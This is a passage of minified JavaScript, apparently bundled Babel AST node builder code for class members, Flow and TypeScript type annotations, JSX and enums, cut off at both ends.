W={type:"ClassPrivateProperty",key:X,value:J,decorators:Q,static:Y},z=x.ClassPrivateProperty;return R(z.key,W,"key",X,1),R(z.value,W,"value",J,1),R(z.decorators,W,"decorators",Q,1),R(z.static,W,"static",Y),W}function Li(X="method",J,Q,Y,W=!1){let z={type:"ClassPrivateMethod",kind:X,key:J,params:Q,body:Y,static:W},G=x.ClassPrivateMethod;return R(G.kind,z,"kind",X),R(G.key,z,"key",J,1),R(G.params,z,"params",Q,1),R(G.body,z,"body",Y,1),R(G.static,z,"static",W),z}function Di(X){let J={type:"PrivateName",id:X},Q=x.PrivateName;return R(Q.id,J,"id",X,1),J}function wi(X){let J={type:"StaticBlock",body:X},Q=x.StaticBlock;return R(Q.body,J,"body",X,1),J}function Ii(X,J){let Q={type:"ImportAttribute",key:X,value:J},Y=x.ImportAttribute;return R(Y.key,Q,"key",X,1),R(Y.value,Q,"value",J,1),Q}function Ci(){return{type:"AnyTypeAnnotation"}}function Pi(X){let J={type:"ArrayTypeAnnotation",elementType:X},Q=x.ArrayTypeAnnotation;return R(Q.elementType,J,"elementType",X,1),J}function Si(){return{type:"BooleanTypeAnnotation"}}function Ti(X){let J={type:"BooleanLiteralTypeAnnotation",value:X},Q=x.BooleanLiteralTypeAnnotation;return R(Q.value,J,"value",X),J}function _i(){return{type:"NullLiteralTypeAnnotation"}}function Ei(X,J=null){let Q={type:"ClassImplements",id:X,typeParameters:J},Y=x.ClassImplements;return R(Y.id,Q,"id",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function $i(X,J=null,Q=null,Y){let W={type:"DeclareClass",id:X,typeParameters:J,extends:Q,body:Y},z=x.DeclareClass;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.extends,W,"extends",Q,1),R(z.body,W,"body",Y,1),W}function ki(X){let J={type:"DeclareFunction",id:X},Q=x.DeclareFunction;return R(Q.id,J,"id",X,1),J}function bi(X,J=null,Q=null,Y){let W={type:"DeclareInterface",id:X,typeParameters:J,extends:Q,body:Y},z=x.DeclareInterface;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.extends,W,"extends",Q,1),R(z.body,W,"body",Y,1),W}function vi(X,J,Q=null){let Y={type:"DeclareModule",id:X,body:J,kind:Q},W=x.DeclareModule;return R(W.id,Y,"id",X,1),R(W.body,Y,"body",J,1),R(W.kind,Y,"kind",Q),Y}function xi(X){let J={type:"DeclareModuleExports",typeAnnotation:X},Q=x.DeclareModuleExports;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function fi(X,J=null,Q){let Y={type:"DeclareTypeAlias",id:X,typeParameters:J,right:Q},W=x.DeclareTypeAlias;return R(W.id,Y,"id",X,1),R(W.typeParameters,Y,"typeParameters",J,1),R(W.right,Y,"right",Q,1),Y}function gi(X,J=null,Q=null){let Y={type:"DeclareOpaqueType",id:X,typeParameters:J,supertype:Q},W=x.DeclareOpaqueType;return R(W.id,Y,"id",X,1),R(W.typeParameters,Y,"typeParameters",J,1),R(W.supertype,Y,"supertype",Q,1),Y}function hi(X){let J={type:"DeclareVariable",id:X},Q=x.DeclareVariable;return R(Q.id,J,"id",X,1),J}function yi(X=null,J=null,Q=null,Y=null){let W={type:"DeclareExportDeclaration",declaration:X,specifiers:J,source:Q,attributes:Y},z=x.DeclareExportDeclaration;return R(z.declaration,W,"declaration",X,1),R(z.specifiers,W,"specifiers",J,1),R(z.source,W,"source",Q,1),R(z.attributes,W,"attributes",Y,1),W}function mi(X,J=null){let Q={type:"DeclareExportAllDeclaration",source:X,attributes:J},Y=x.DeclareExportAllDeclaration;return R(Y.source,Q,"source",X,1),R(Y.attributes,Q,"attributes",J,1),Q}function ui(X){let J={type:"DeclaredPredicate",value:X},Q=x.DeclaredPredicate;return R(Q.value,J,"value",X,1),J}function ci(){return{type:"ExistsTypeAnnotation"}}function li(X=null,J,Q=null,Y){let W={type:"FunctionTypeAnnotation",typeParameters:X,params:J,rest:Q,returnType:Y},z=x.FunctionTypeAnnotation;return R(z.typeParameters,W,"typeParameters",X,1),R(z.params,W,"params",J,1),R(z.rest,W,"rest",Q,1),R(z.returnType,W,"returnType",Y,1),W}function pi(X=null,J){let Q={type:"FunctionTypeParam",name:X,typeAnnotation:J},Y=x.FunctionTypeParam;return R(Y.name,Q,"name",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function di(X,J=null){let Q={type:"GenericTypeAnnotation",id:X,typeParameters:J},Y=x.GenericTypeAnnotation;return R(Y.id,Q,"id",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function ii(){return{type:"InferredPredicate"}}function ri(X,J=null){let Q={type:"InterfaceExtends",id:X,typeParameters:J},Y=x.InterfaceExtends;return R(Y.id,Q,"id",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function ni(X,J=null,Q=null,Y){let W={type:"InterfaceDeclaration",id:X,typeParameters:J,extends:Q,body:Y},z=x.InterfaceDeclaration;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.extends,W,"extends",Q,1),R(z.body,W,"body",Y,1),W}function ai(X=null,J){let Q={type:"InterfaceTypeAnnotation",extends:X,body:J},Y=x.InterfaceTypeAnnotation;return R(Y.extends,Q,"extends",X,1),R(Y.body,Q,"body",J,1),Q}function si(X){let J={type:"IntersectionTypeAnnotation",types:X},Q=x.IntersectionTypeAnnotation;return R(Q.types,J,"types",X,1),J}function oi(){return{type:"MixedTypeAnnotation"}}function ti(){return{type:"EmptyTypeAnnotation"}}function ei(X){let J={type:"NullableTypeAnnotation",typeAnnotation:X},Q=x.NullableTypeAnnotation;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Xr(X){let J={type:"NumberLiteralTypeAnnotation",value:X},Q=x.NumberLiteralTypeAnnotation;return R(Q.value,J,"value",X),J}function Jr(){return{type:"NumberTypeAnnotation"}}function Qr(X,J=[],Q=[],Y=[],W=!1){let z={type:"ObjectTypeAnnotation",properties:X,indexers:J,callProperties:Q,internalSlots:Y,exact:W},G=x.ObjectTypeAnnotation;return R(G.properties,z,"properties",X,1),R(G.indexers,z,"indexers",J,1),R(G.callProperties,z,"callProperties",Q,1),R(G.internalSlots,z,"internalSlots",Y,1),R(G.exact,z,"exact",W),z}function Yr(X,J,Q,Y,W){let z={type:"ObjectTypeInternalSlot",id:X,value:J,optional:Q,static:Y,method:W},G=x.ObjectTypeInternalSlot;return R(G.id,z,"id",X,1),R(G.value,z,"value",J,1),R(G.optional,z,"optional",Q),R(G.static,z,"static",Y),R(G.method,z,"method",W),z}function Wr(X){let J={type:"ObjectTypeCallProperty",value:X,static:null},Q=x.ObjectTypeCallProperty;return R(Q.value,J,"value",X,1),J}function Gr(X=null,J,Q,Y=null){let W={type:"ObjectTypeIndexer",id:X,key:J,value:Q,variance:Y,static:null},z=x.ObjectTypeIndexer;return R(z.id,W,"id",X,1),R(z.key,W,"key",J,1),R(z.value,W,"value",Q,1),R(z.variance,W,"variance",Y,1),W}function zr(X,J,Q=null){let Y={type:"ObjectTypeProperty",key:X,value:J,variance:Q,kind:null,method:null,optional:null,proto:null,static:null},W=x.ObjectTypeProperty;return R(W.key,Y,"key",X,1),R(W.value,Y,"value",J,1),R(W.variance,Y,"variance",Q,1),Y}function Hr(X){let J={type:"ObjectTypeSpreadProperty",argument:X},Q=x.ObjectTypeSpreadProperty;return R(Q.argument,J,"argument",X,1),J}function Ur(X,J=null,Q=null,Y){let W={type:"OpaqueType",id:X,typeParameters:J,supertype:Q,impltype:Y},z=x.OpaqueType;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.supertype,W,"supertype",Q,1),R(z.impltype,W,"impltype",Y,1),W}function Kr(X,J){let Q={type:"QualifiedTypeIdentifier",id:X,qualification:J},Y=x.QualifiedTypeIdentifier;return R(Y.id,Q,"id",X,1),R(Y.qualification,Q,"qualification",J,1),Q}function Vr(X){let J={type:"StringLiteralTypeAnnotation",value:X},Q=x.StringLiteralTypeAnnotation;return R(Q.value,J,"value",X),J}function Br(){return{type:"StringTypeAnnotation"}}function qr(){return{type:"SymbolTypeAnnotation"}}function Zr(){return{type:"ThisTypeAnnotation"}}function Mr(X){let J={type:"TupleTypeAnnotation",types:X},Q=x.TupleTypeAnnotation;return R(Q.types,J,"types",X,1),J}function Fr(X){let J={type:"TypeofTypeAnnotation",argument:X},Q=x.TypeofTypeAnnotation;return R(Q.argument,J,"argument",X,1),J}function jr(X,J=null,Q){let Y={type:"TypeAlias",id:X,typeParameters:J,right:Q},W=x.TypeAlias;return R(W.id,Y,"id",X,1),R(W.typeParameters,Y,"typeParameters",J,1),R(W.right,Y,"right",Q,1),Y}function Or(X){let J={type:"TypeAnnotation",typeAnnotation:X},Q=x.TypeAnnotation;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Rr(X,J){let Q={type:"TypeCastExpression",expression:X,typeAnnotation:J},Y=x.TypeCastExpression;return R(Y.expression,Q,"expression",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function Ar(X=null,J=null,Q=null){let Y={type:"TypeParameter",bound:X,default:J,variance:Q,name:null},W=x.TypeParameter;return R(W.bound,Y,"bound",X,1),R(W.default,Y,"default",J,1),R(W.variance,Y,"variance",Q,1),Y}function Nr(X){let J={type:"TypeParameterDeclaration",params:X},Q=x.TypeParameterDeclaration;return R(Q.params,J,"params",X,1),J}function Lr(X){let J={type:"TypeParameterInstantiation",params:X},Q=x.TypeParameterInstantiation;return R(Q.params,J,"params",X,1),J}function Dr(X){let J={type:"UnionTypeAnnotation",types:X},Q=x.UnionTypeAnnotation;return R(Q.types,J,"types",X,1),J}function wr(X){let J={type:"Variance",kind:X},Q=x.Variance;return R(Q.kind,J,"kind",X),J}function Ir(){return{type:"VoidTypeAnnotation"}}function Cr(X,J){let Q={type:"EnumDeclaration",id:X,body:J},Y=x.EnumDeclaration;return R(Y.id,Q,"id",X,1),R(Y.body,Q,"body",J,1),Q}function Pr(X){let J={type:"EnumBooleanBody",members:X,explicitType:null,hasUnknownMembers:null},Q=x.EnumBooleanBody;return R(Q.members,J,"members",X,1),J}function Sr(X){let J={type:"EnumNumberBody",members:X,explicitType:null,hasUnknownMembers:null},Q=x.EnumNumberBody;return R(Q.members,J,"members",X,1),J}function Tr(X){let J={type:"EnumStringBody",members:X,explicitType:null,hasUnknownMembers:null},Q=x.EnumStringBody;return R(Q.members,J,"members",X,1),J}function _r(X){let J={type:"EnumSymbolBody",members:X,hasUnknownMembers:null},Q=x.EnumSymbolBody;return R(Q.members,J,"members",X,1),J}function Er(X){let J={type:"EnumBooleanMember",id:X,init:null},Q=x.EnumBooleanMember;return R(Q.id,J,"id",X,1),J}function $r(X,J){let Q={type:"EnumNumberMember",id:X,init:J},Y=x.EnumNumberMember;return R(Y.id,Q,"id",X,1),R(Y.init,Q,"init",J,1),Q}function kr(X,J){let Q={type:"EnumStringMember",id:X,init:J},Y=x.EnumStringMember;return R(Y.id,Q,"id",X,1),R(Y.init,Q,"init",J,1),Q}function br(X){let J={type:"EnumDefaultedMember",id:X},Q=x.EnumDefaultedMember;return R(Q.id,J,"id",X,1),J}function vr(X,J){let Q={type:"IndexedAccessType",objectType:X,indexType:J},Y=x.IndexedAccessType;return R(Y.objectType,Q,"objectType",X,1),R(Y.indexType,Q,"indexType",J,1),Q}function xr(X,J){let Q={type:"OptionalIndexedAccessType",objectType:X,indexType:J,optional:null},Y=x.OptionalIndexedAccessType;return R(Y.objectType,Q,"objectType",X,1),R(Y.indexType,Q,"indexType",J,1),Q}function fr(X,J=null){let Q={type:"JSXAttribute",name:X,value:J},Y=x.JSXAttribute;return R(Y.name,Q,"name",X,1),R(Y.value,Q,"value",J,1),Q}function gr(X){let J={type:"JSXClosingElement",name:X},Q=x.JSXClosingElement;return R(Q.name,J,"name",X,1),J}function hr(X,J=null,Q,Y=null){let W={type:"JSXElement",openingElement:X,closingElement:J,children:Q,selfClosing:Y},z=x.JSXElement;return R(z.openingElement,W,"openingElement",X,1),R(z.closingElement,W,"closingElement",J,1),R(z.children,W,"children",Q,1),R(z.selfClosing,W,"selfClosing",Y),W}function yr(){return{type:"JSXEmptyExpression"}}function mr(X){let J={type:"JSXExpressionContainer",expression:X},Q=x.JSXExpressionContainer;return R(Q.expression,J,"expression",X,1),J}function ur(X){let J={type:"JSXSpreadChild",expression:X},Q=x.JSXSpreadChild;return R(Q.expression,J,"expression",X,1),J}function cr(X){let J={type:"JSXIdentifier",name:X},Q=x.JSXIdentifier;return R(Q.name,J,"name",X),J}function lr(X,J){let Q={type:"JSXMemberExpression",object:X,property:J},Y=x.JSXMemberExpression;return R(Y.object,Q,"object",X,1),R(Y.property,Q,"property",J,1),Q}function pr(X,J){let Q={type:"JSXNamespacedName",namespace:X,name:J},Y=x.JSXNamespacedName;return R(Y.namespace,Q,"namespace",X,1),R(Y.name,Q,"name",J,1),Q}function dr(X,J,Q=!1){let Y={type:"JSXOpeningElement",name:X,attributes:J,selfClosing:Q},W=x.JSXOpeningElement;return R(W.name,Y,"name",X,1),R(W.attributes,Y,"attributes",J,1),R(W.selfClosing,Y,"selfClosing",Q),Y}function ir(X){let J={type:"JSXSpreadAttribute",argument:X},Q=x.JSXSpreadAttribute;return R(Q.argument,J,"argument",X,1),J}function rr(X){let J={type:"JSXText",value:X},Q=x.JSXText;return R(Q.value,J,"value",X),J}function nr(X,J,Q){let Y={type:"JSXFragment",openingFragment:X,closingFragment:J,children:Q},W=x.JSXFragment;return R(W.openingFragment,Y,"openingFragment",X,1),R(W.closingFragment,Y,"closingFragment",J,1),R(W.children,Y,"children",Q,1),Y}function ar(){return{type:"JSXOpeningFragment"}}function sr(){return{type:"JSXClosingFragment"}}function or(){return{type:"Noop"}}function tr(X,J){let Q={type:"Placeholder",expectedNode:X,name:J},Y=x.Placeholder;return R(Y.expectedNode,Q,"expectedNode",X),R(Y.name,Q,"name",J,1),Q}function er(X){let J={type:"V8IntrinsicIdentifier",name:X},Q=x.V8IntrinsicIdentifier;return R(Q.name,J,"name",X),J}function Xn(){return{type:"ArgumentPlaceholder"}}function Jn(X,J){let Q={type:"BindExpression",object:X,callee:J},Y=x.BindExpression;return R(Y.object,Q,"object",X,1),R(Y.callee,Q,"callee",J,1),Q}function Qn(X){let J={type:"Decorator",expression:X},Q=x.Decorator;return R(Q.expression,J,"expression",X,1),J}function Yn(X,J=!1){let Q={type:"DoExpression",body:X,async:J},Y=x.DoExpression;return R(Y.body,Q,"body",X,1),R(Y.async,Q,"async",J),Q}function Wn(X){let J={type:"ExportDefaultSpecifier",exported:X},Q=x.ExportDefaultSpecifier;return R(Q.exported,J,"exported",X,1),J}function Gn(X){let J={type:"RecordExpression",properties:X},Q=x.RecordExpression;return R(Q.properties,J,"properties",X,1),J}function zn(X=[]){let J={type:"TupleExpression",elements:X},Q=x.TupleExpression;return R(Q.elements,J,"elements",X,1),J}function Hn(X){let J={type:"DecimalLiteral",value:X},Q=x.DecimalLiteral;return R(Q.value,J,"value",X),J}function Un(X){let J={type:"ModuleExpression",body:X},Q=x.ModuleExpression;return R(Q.body,J,"body",X,1),J}function Kn(){return{type:"TopicReference"}}function Vn(X){let J={type:"PipelineTopicExpression",expression:X},Q=x.PipelineTopicExpression;return R(Q.expression,J,"expression",X,1),J}function Bn(X){let J={type:"PipelineBareFunction",callee:X},Q=x.PipelineBareFunction;return R(Q.callee,J,"callee",X,1),J}function qn(){return{type:"PipelinePrimaryTopicReference"}}function Zn(){return{type:"VoidPattern"}}function Mn(X){let J={type:"TSParameterProperty",parameter:X},Q=x.TSParameterProperty;return R(Q.parameter,J,"parameter",X,1),J}function Fn(X=null,J=null,Q,Y=null){let W={type:"TSDeclareFunction",id:X,typeParameters:J,params:Q,returnType:Y},z=x.TSDeclareFunction;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.params,W,"params",Q,1),R(z.returnType,W,"returnType",Y,1),W}function jn(X=null,J,Q=null,Y,W=null){let z={type:"TSDeclareMethod",decorators:X,key:J,typeParameters:Q,params:Y,returnType:W},G=x.TSDeclareMethod;return R(G.decorators,z,"decorators",X,1),R(G.key,z,"key",J,1),R(G.typeParameters,z,"typeParameters",Q,1),R(G.params,z,"params",Y,1),R(G.returnType,z,"returnType",W,1),z}function On(X,J){let Q={type:"TSQualifiedName",left:X,right:J},Y=x.TSQualifiedName;return R(Y.left,Q,"left",X,1),R(Y.right,Q,"right",J,1),Q}function Rn(X=null,J,Q=null){let Y={type:"TSCallSignatureDeclaration",typeParameters:X,parameters:J,typeAnnotation:Q},W=x.TSCallSignatureDeclaration;return R(W.typeParameters,Y,"typeParameters",X,1),R(W.parameters,Y,"parameters",J,1),R(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function An(X=null,J,Q=null){let Y={type:"TSConstructSignatureDeclaration",typeParameters:X,parameters:J,typeAnnotation:Q},W=x.TSConstructSignatureDeclaration;return R(W.typeParameters,Y,"typeParameters",X,1),R(W.parameters,Y,"parameters",J,1),R(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Nn(X,J=null){let Q={type:"TSPropertySignature",key:X,typeAnnotation:J},Y=x.TSPropertySignature;return R(Y.key,Q,"key",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function Ln(X,J=null,Q,Y=null){let W={type:"TSMethodSignature",key:X,typeParameters:J,parameters:Q,typeAnnotation:Y,kind:null},z=x.TSMethodSignature;return R(z.key,W,"key",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.parameters,W,"parameters",Q,1),R(z.typeAnnotation,W,"typeAnnotation",Y,1),W}function Dn(X,J=null){let Q={type:"TSIndexSignature",parameters:X,typeAnnotation:J},Y=x.TSIndexSignature;return R(Y.parameters,Q,"parameters",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function wn(){return{type:"TSAnyKeyword"}}function In(){return{type:"TSBooleanKeyword"}}function Cn(){return{type:"TSBigIntKeyword"}}function Pn(){return{type:"TSIntrinsicKeyword"}}function Sn(){return{type:"TSNeverKeyword"}}function Tn(){return{type:"TSNullKeyword"}}function _n(){return{type:"TSNumberKeyword"}}function En(){return{type:"TSObjectKeyword"}}function $n(){return{type:"TSStringKeyword"}}function kn(){return{type:"TSSymbolKeyword"}}function bn(){return{type:"TSUndefinedKeyword"}}function vn(){return{type:"TSUnknownKeyword"}}function xn(){return{type:"TSVoidKeyword"}}function fn(){return{type:"TSThisType"}}function gn(X=null,J,Q=null){let Y={type:"TSFunctionType",typeParameters:X,parameters:J,typeAnnotation:Q},W=x.TSFunctionType;return R(W.typeParameters,Y,"typeParameters",X,1),R(W.parameters,Y,"parameters",J,1),R(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function hn(X=null,J,Q=null){let Y={type:"TSConstructorType",typeParameters:X,parameters:J,typeAnnotation:Q},W=x.TSConstructorType;return R(W.typeParameters,Y,"typeParameters",X,1),R(W.parameters,Y,"parameters",J,1),R(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function yn(X,J=null){let Q={type:"TSTypeReference",typeName:X,typeParameters:J},Y=x.TSTypeReference;return R(Y.typeName,Q,"typeName",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function mn(X,J=null,Q=null){let Y={type:"TSTypePredicate",parameterName:X,typeAnnotation:J,asserts:Q},W=x.TSTypePredicate;return R(W.parameterName,Y,"parameterName",X,1),R(W.typeAnnotation,Y,"typeAnnotation",J,1),R(W.asserts,Y,"asserts",Q),Y}function un(X,J=null){let Q={type:"TSTypeQuery",exprName:X,typeParameters:J},Y=x.TSTypeQuery;return R(Y.exprName,Q,"exprName",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function cn(X){let J={type:"TSTypeLiteral",members:X},Q=x.TSTypeLiteral;return R(Q.members,J,"members",X,1),J}function ln(X){let J={type:"TSArrayType",elementType:X},Q=x.TSArrayType;return R(Q.elementType,J,"elementType",X,1),J}function pn(X){let J={type:"TSTupleType",elementTypes:X},Q=x.TSTupleType;return R(Q.elementTypes,J,"elementTypes",X,1),J}function dn(X){let J={type:"TSOptionalType",typeAnnotation:X},Q=x.TSOptionalType;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function rn(X){let J={type:"TSRestType",typeAnnotation:X},Q=x.TSRestType;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function nn(X,J,Q=!1){let Y={type:"TSNamedTupleMember",label:X,elementType:J,optional:Q},W=x.TSNamedTupleMember;return R(W.label,Y,"label",X,1),R(W.elementType,Y,"elementType",J,1),R(W.optional,Y,"optional",Q),Y}function an(X){let J={type:"TSUnionType",types:X},Q=x.TSUnionType;return R(Q.types,J,"types",X,1),J}function sn(X){let J={type:"TSIntersectionType",types:X},Q=x.TSIntersectionType;return R(Q.types,J,"types",X,1),J}function on(X,J,Q,Y){let W={type:"TSConditionalType",checkType:X,extendsType:J,trueType:Q,falseType:Y},z=x.TSConditionalType;return R(z.checkType,W,"checkType",X,1),R(z.extendsType,W,"extendsType",J,1),R(z.trueType,W,"trueType",Q,1),R(z.falseType,W,"falseType",Y,1),W}function tn(X){let J={type:"TSInferType",typeParameter:X},Q=x.TSInferType;return R(Q.typeParameter,J,"typeParameter",X,1),J}function en(X){let J={type:"TSParenthesizedType",typeAnnotation:X},Q=x.TSParenthesizedType;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Xa(X,J="keyof"){let Q={type:"TSTypeOperator",typeAnnotation:X,operator:J},Y=x.TSTypeOperator;return R(Y.typeAnnotation,Q,"typeAnnotation",X,1),R(Y.operator,Q,"operator",J),Q}function Ja(X,J){let Q={type:"TSIndexedAccessType",objectType:X,indexType:J},Y=x.TSIndexedAccessType;return R(Y.objectType,Q,"objectType",X,1),R(Y.indexType,Q,"indexType",J,1),Q}function Qa(X,J=null,Q=null){let Y={type:"TSMappedType",typeParameter:X,typeAnnotation:J,nameType:Q},W=x.TSMappedType;return R(W.typeParameter,Y,"typeParameter",X,1),R(W.typeAnnotation,Y,"typeAnnotation",J,1),R(W.nameType,Y,"nameType",Q,1),Y}function Ya(X,J){let Q={type:"TSTemplateLiteralType",quasis:X,types:J},Y=x.TSTemplateLiteralType;return R(Y.quasis,Q,"quasis",X,1),R(Y.types,Q,"types",J,1),Q}function Wa(X){let J={type:"TSLiteralType",literal:X},Q=x.TSLiteralType;return R(Q.literal,J,"literal",X,1),J}function Ga(X,J=null){let Q={type:"TSExpressionWithTypeArguments",expression:X,typeParameters:J},Y=x.TSExpressionWithTypeArguments;return R(Y.expression,Q,"expression",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function za(X,J=null,Q=null,Y){let W={type:"TSInterfaceDeclaration",id:X,typeParameters:J,extends:Q,body:Y},z=x.TSInterfaceDeclaration;return R(z.id,W,"id",X,1),R(z.typeParameters,W,"typeParameters",J,1),R(z.extends,W,"extends",Q,1),R(z.body,W,"body",Y,1),W}function Ha(X){let J={type:"TSInterfaceBody",body:X},Q=x.TSInterfaceBody;return R(Q.body,J,"body",X,1),J}function Ua(X,J=null,Q){let Y={type:"TSTypeAliasDeclaration",id:X,typeParameters:J,typeAnnotation:Q},W=x.TSTypeAliasDeclaration;return R(W.id,Y,"id",X,1),R(W.typeParameters,Y,"typeParameters",J,1),R(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Ka(X,J=null){let Q={type:"TSInstantiationExpression",expression:X,typeParameters:J},Y=x.TSInstantiationExpression;return R(Y.expression,Q,"expression",X,1),R(Y.typeParameters,Q,"typeParameters",J,1),Q}function Va(X,J){let Q={type:"TSAsExpression",expression:X,typeAnnotation:J},Y=x.TSAsExpression;return R(Y.expression,Q,"expression",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function Ba(X,J){let Q={type:"TSSatisfiesExpression",expression:X,typeAnnotation:J},Y=x.TSSatisfiesExpression;return R(Y.expression,Q,"expression",X,1),R(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function qa(X,J){let Q={type:"TSTypeAssertion",typeAnnotation:X,expression:J},Y=x.TSTypeAssertion;return R(Y.typeAnnotation,Q,"typeAnnotation",X,1),R(Y.expression,Q,"expression",J,1),Q}function Za(X){let J={type:"TSEnumBody",members:X},Q=x.TSEnumBody;return R(Q.members,J,"members",X,1),J}function Ma(X,J){let Q={type:"TSEnumDeclaration",id:X,members:J},Y=x.TSEnumDeclaration;return R(Y.id,Q,"id",X,1),R(Y.members,Q,"members",J,1),Q}function Fa(X,J=null){let Q={type:"TSEnumMember",id:X,initializer:J},Y=x.TSEnumMember;return R(Y.id,Q,"id",X,1),R(Y.initializer,Q,"initializer",J,1),Q}function ja(X,J){let Q={type:"TSModuleDeclaration",id:X,body:J,kind:null},Y=x.TSModuleDeclaration;return R(Y.id,Q,"id",X,1),R(Y.body,Q,"body",J,1),Q}function Oa(X){let J={type:"TSModuleBlock",body:X},Q=x.TSModuleBlock;return R(Q.body,J,"body",X,1),J}function Ra(X,J=null,Q=null){let Y={type:"TSImportType",argument:X,qualifier:J,typeParameters:Q},W=x.TSImportType;return R(W.argument,Y,"argument",X,1),R(W.qualifier,Y,"qualifier",J,1),R(W.typeParameters,Y,"typeParameters",Q,1),Y}function Aa(X,J){let Q={type:"TSImportEqualsDeclaration",id:X,moduleReference:J,isExport:null},Y=x.TSImportEqualsDeclaration;return R(Y.id,Q,"id",X,1),R(Y.moduleReference,Q,"moduleReference",J,1),Q}function Na(X){let J={type:"TSExternalModuleReference",expression:X},Q=x.TSExternalModuleReference;return R(Q.expression,J,"expression",X,1),J}function La(X){let J={type:"TSNonNullExpression",expression:X},Q=x.TSNonNullExpression;return R(Q.expression,J,"expression",X,1),J}function Da(X){let J={type:"TSExportAssignment",expression:X},Q=x.TSExportAssignment;return R(Q.expression,J,"expression",X,1),J}function wa(X){let J={type:"TSNamespaceExportDeclaration",id:X},Q=x.TSNamespaceExportDeclaration;return R(Q.id,J,"id",X,1),J}function Ia(X){let J={type:"TSTypeAnnotation",typeAnnotation:X},Q=x.TSTypeAnnotation;return R(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Ca(X){let J={type:"TSTypeParameterInstantiation",params:X},Q=x.TSTypeParameterInstantiation;return R(Q.params,J,"params",X,1),J}function Pa(X){let J={type:"TSTypeParameterDeclaration",params:X},Q=x.TSTypeParameterDeclaration;return R(Q.params,J,"params",X,1),J}function Sa(X=null,J=null,Q){let Y={type:"TSTypeParameter",constraint:X,default:J,name:Q},W=x.TSTypeParameter;return R(W.constraint,Y,"constraint",X,1),R(W.default,Y,"default",J,1),R(W.name,Y,"name",Q),Y}function Ta(X){return D4.default("NumberLiteral","NumericLiteral","The node type "),Jq(X)}function _a(X,J=""){return D4.default("RegexLiteral","RegExpLiteral","The node type "),Qq(X,J)}function Ea(X){return D4.default("RestProperty","RestElement","The node type "),Yq(X)}function $a(X){return D4.default("SpreadProperty","SpreadElement","The node type "),Wq(X)}});var Vq=c((zq)=>{Object.defineProperty(zq,"__esModule",{value:!0});zq.JSXIdentifier=zq.JSXFragment=zq.JSXExpressionContainer=zq.JSXEmptyExpression=zq.JSXElement=zq.JSXClosingFragment=zq.JSXClosingElement=zq.JSXAttribute=zq.IntersectionTypeAnnotation=zq.InterpreterDirective=zq.InterfaceTypeAnnotation=zq.InterfaceExtends=zq.InterfaceDeclaration=zq.InferredPredicate=zq.IndexedAccessType=zq.ImportSpecifier=zq.ImportNamespaceSpecifier=zq.ImportExpression=zq.ImportDefaultSpecifier=zq.ImportDeclaration=zq.ImportAttribute=zq.Import=zq.IfStatement=zq.Identifier=zq.GenericTypeAnnotation=zq.FunctionTypeParam=zq.FunctionTypeAnnotation=zq.FunctionExpression=zq.FunctionDeclaration=zq.ForStatement=zq.ForOfStatement=zq.ForInStatement=zq.File=zq.ExpressionStatement=zq.ExportSpecifier=zq.ExportNamespaceSpecifier=zq.ExportNamedDeclaration=zq.ExportDefaultSpecifier=zq.ExportDefaultDeclaration=zq.ExportAllDeclaration=zq.ExistsTypeAnnotation=zq.EnumSymbolBody=zq.EnumStringMember=zq.EnumStringBody=zq.EnumNumberMember=zq.EnumNumberBody=zq.EnumDefaultedMember=zq.EnumDeclaration=zq.EnumBooleanMember=zq.EnumBooleanBody=zq.EmptyTypeAnnotation=zq.EmptyStatement=zq.DoWhileStatement=zq.DoExpression=zq.DirectiveLiteral=zq.Directive=zq.Decorator=zq.DeclaredPredicate=zq.DeclareVariable=zq.DeclareTypeAlias=zq.DeclareOpaqueType=zq.DeclareModuleExports=zq.DeclareModule=zq.DeclareInterface=zq.DeclareFunction=zq.DeclareExportDeclaration=zq.DeclareExportAllDeclaration=zq.DeclareClass=zq.DecimalLiteral=zq.DebuggerStatement=zq.ContinueStatement=zq.ConditionalExpression=zq.ClassProperty=zq.ClassPrivateProperty=zq.ClassPrivateMethod=zq.ClassMethod=zq.ClassImplements=zq.ClassExpression=zq.ClassDeclaration=zq.ClassBody=zq.ClassAccessorProperty=zq.CatchClause=zq.CallExpression=zq.BreakStatement=zq.BooleanTypeAnnotation=zq.BooleanLiteralTypeAnnotation=zq.BooleanLiteral=zq.BlockStatement=zq.BindExpression=zq.BinaryExpression=zq.BigIntLiteral=zq.AwaitExpression=zq.AssignmentPattern=zq.AssignmentExpression=zq.ArrowFunctionExpression=zq.ArrayTypeAnnotation=zq.ArrayPattern=zq.ArrayExpression=zq.ArgumentPlaceholder=zq.AnyTypeAnnotation=void 